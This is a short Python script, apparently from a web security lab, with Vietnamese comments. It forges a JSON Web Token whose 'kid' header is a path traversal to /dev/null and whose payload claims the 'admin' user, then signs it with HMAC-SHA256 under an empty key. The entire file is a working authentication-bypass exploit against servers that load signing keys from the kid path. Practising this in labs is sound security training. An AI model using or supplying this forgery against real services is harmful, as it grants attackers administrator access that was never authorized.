import base64
import hmac
import hashlib
import json
#this lab is use for kid param in header
header = {"typ": "JWT", "alg": "HS256", "kid": "../../../../../../../../../../../../dev/null"}
payload = {"user": "admin"}
key = b""  # key phải là bytes

# Chuyển header và payload sang JSON string rồi encode sang bytes
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")

# Ghép chuỗi header.payload
a = header_b64 + b"." + payload_b64

# Tính chữ ký HMAC SHA256
sig = base64.urlsafe_b64encode(hmac.new(key, a, hashlib.sha256).digest()).rstrip(b"=")

# In ra JWT: header.payload.signature (tất cả là string)
print((a + b"." + sig).decode())
